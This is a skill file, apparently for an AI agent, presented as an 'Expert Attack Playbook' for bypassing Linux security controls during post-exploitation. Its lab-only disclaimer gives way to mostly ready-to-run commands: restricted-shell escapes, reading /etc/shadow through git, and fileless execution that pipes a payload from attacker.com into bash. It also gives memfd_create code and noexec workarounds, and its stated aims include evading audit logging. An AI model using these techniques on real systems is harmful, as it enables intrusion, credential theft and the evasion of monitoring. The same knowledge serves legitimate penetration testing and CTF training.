---
name: linux-security-bypass
description: >-
  Linux security mechanism bypass playbook. Use when facing restricted bash/rbash, read-only or noexec filesystems, AppArmor, SELinux, seccomp filters, or audit logging that must be evaded during post-exploitation.
---

# SKILL: Linux Security Bypass — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert techniques for bypassing Linux security mechanisms. Covers restricted shell escape, noexec bypass, AppArmor/SELinux evasion, seccomp circumvention, and audit evasion. Pay particular attention to DDexec, memfd_create fileless execution, and architecture-confusion seccomp bypass.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `linux-privilege-escalation` once you've broken out of restrictions and need to escalate
- `container-escape-techniques` when security mechanisms are container-specific (seccomp profiles, AppArmor docker-default)
- `linux-lateral-movement` after bypassing restrictions for pivoting
- `cmdi-command-injection` when the restriction is on command execution from a web application context

---

## 1. RESTRICTED BASH (rbash) BYPASS

### 1.1 SSH-Based Bypass

```bash
# Force a different shell via SSH
ssh user@host -t "bash --noprofile --norc"
ssh user@host -t "/bin/sh"
ssh user@host -t "bash -l"

# If ForceCommand is set in sshd_config, these may not work
# Try SFTP/SCP instead — often not restricted:
sftp user@host
# SFTP shell can sometimes execute commands
```

### 1.2 Editor-Based Escape

```bash
# vi/vim escape
vi
:set shell=/bin/bash
:shell
# Or: :!/bin/bash

# ed escape
ed
!/bin/bash

# nano (if available)
# Ctrl+R → Ctrl+X → command execution
```

### 1.3 Language Interpreter Escape

| Interpreter | Command |
|---|---|
| Python | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| Perl | `perl -e 'exec "/bin/bash";'` |
| Ruby | `ruby -e 'exec "/bin/bash"'` |
| Lua | `lua -e 'os.execute("/bin/bash")'` |
| PHP | `php -r 'system("/bin/bash");'` |
| Node.js | `node -e 'require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'` |
| AWK | `awk 'BEGIN {system("/bin/bash")}'` |

### 1.4 Environment Variable Tricks

```bash
# Overwrite shell via BASH_CMDS
BASH_CMDS[x]=/bin/bash
x

# Use env to spawn unrestricted shell
env /bin/bash
env -i /bin/bash

# PATH manipulation (if export is allowed)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
/bin/bash

# If only specific commands are allowed:
# Use allowed command to read files
git log --oneline --all -p    # git can read arbitrary files
git diff /dev/null /etc/shadow
```

### 1.5 Other Escapes

| Method | Command |
|---|---|
| `expect` | `expect -c 'spawn /bin/bash; interact'` |
| `script` | `script -qc /bin/bash /dev/null` |
| `rlwrap` | `rlwrap /bin/bash` |
| `nmap` (old) | `nmap --interactive` → `!bash` |

---

## 2. READ-ONLY / NOEXEC FILESYSTEM EXECUTION

### 2.1 DDexec — Execute From stdin via /proc/self/mem

```bash
# DDexec overwrites the running process memory with a new binary
# No file written to disk — completely fileless

# Usage: pipe any ELF binary through DDexec
curl -sL https://attacker.com/payload | bash ddexec.sh

# How it works:
# 1. Opens /proc/self/mem for writing
# 2. Seeks to the text segment of the current process
# 3. Overwrites it with the target ELF binary
# 4. Jumps to the new entry point
```

### 2.2 memfd_create — In-Memory File Descriptor

```python
import ctypes, os
libc = ctypes.CDLL("libc.so.6")
fd = libc.syscall(319, b"", 0)     # SYS_MEMFD_CREATE (x86_64)
with open(f"/proc/self/fd/{fd}", "wb") as f:
    f.write(open("/path/to/binary", "rb").read())
os.execve(f"/proc/self/fd/{fd}", ["binary"], os.environ)   # Bypasses noexec
```

```bash
# Perl variant: syscall(319, "", 0) → write to fd → exec /proc/$$/fd/$fd
```

### 2.3 ld.so Direct Execution

```bash
# Use the dynamic linker to execute from a writable mount
# Even if the binary's partition is noexec, ld.so runs from its own mount
/lib64/ld-linux-x86-64.so.2 /path/on/noexec/mount/binary

# Or from /dev/shm (usually writable + exec):
cp binary /dev/shm/binary
/dev/shm/binary
```

### 2.4 Script Interpreters on noexec

```bash
# Scripts still execute on noexec — only ELF execution is blocked
# The interpreter (python/perl/bash) runs from an exec-allowed mount
# and reads the script as data

python3 /noexec/mount/exploit.py      # Works
perl /noexec/mount/exploit.pl         # Works
bash /noexec/mount/exploit.sh         # Works
# But ./exploit (ELF binary) → "Permission denied"
```

### 2.5 Writable Mount Points

```bash
# Common writable + exec-capable locations:
/dev/shm        # tmpfs — almost always writable + exec
/tmp            # Sometimes noexec on hardened systems
/var/tmp        # Often writable
/run            # tmpfs — check permissions

# Check mount options:
mount | grep -E "shm|tmp"
# Look for "noexec" flag — if absent, exec is allowed
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 3. APPARMOR BYPASS
- 4. SELINUX BYPASS
- 5. SECCOMP BYPASS
- 6. AUDIT EVASION
- 7. LINUX SECURITY BYPASS DECISION TREE
